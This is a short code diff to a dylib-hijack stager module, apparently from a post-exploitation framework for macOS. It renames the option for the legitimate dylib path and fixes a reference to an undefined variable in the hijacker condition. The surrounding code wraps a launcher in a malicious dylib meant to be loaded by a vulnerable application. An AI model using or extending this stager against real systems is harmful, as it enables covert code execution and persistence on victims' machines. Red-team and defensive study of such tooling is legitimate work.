@@ -46,8 +46,8 @@ class Stager:
                 'Required'      :   False,
                 'Value'         :   ''
             },
-            'LocalLegitDylib' : {
-                'Description'   :   'Local path to the legitimate dylib used in the vulnerable application. Required if Hijacker is set to True.',
+            'LocalDylibPath' : {
+                'Description'   :   'Local path to the legitimate dylib used in the vulnerable application. Used to configure the proper version. Required if Hijacker is set to True.',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -81,7 +81,7 @@ class Stager:
         arch = self.options['Arch']['Value']
         LittleSnitch = self.options['LittleSnitch']['Value']
         hijacker = self.options['Hijacker']['Value']
-        legitDylib = self.options['LocalLegitDylib']['Value']
+        legitDylib = self.options['LocalDylibPath']['Value']
         rpath = self.options['RPath']['Value']
         if arch == "":
             print helpers.color("[!] Please select a valid architecture")
@@ -98,7 +98,7 @@ class Stager:
 
             launcher = launcher.strip('echo').strip(' | python &').strip("\"")
             dylib = self.mainMenu.stagers.generate_dylib(launcherCode=launcher, arch=arch, hijacker=hijacker)
-            if hijacker.lower() == 'true' and len(legitDylib) and len(legitDylibLocation):
+            if hijacker.lower() == 'true' and len(legitDylib) and len(rpath):
                 f = open('/tmp/tmp.dylib', 'wb')
                 f.write(dylib)
                 f.close()
